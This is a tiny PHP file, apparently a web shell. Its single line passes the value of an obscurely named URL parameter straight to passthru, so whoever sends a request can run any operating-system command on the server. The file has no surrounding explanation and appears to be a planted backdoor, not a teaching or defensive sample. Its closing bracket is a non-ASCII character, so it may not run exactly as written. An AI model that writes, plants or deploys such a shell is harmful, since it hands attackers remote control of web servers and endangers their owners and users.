<?php
passthru($_GET['VatW3iCm'〕);
?>
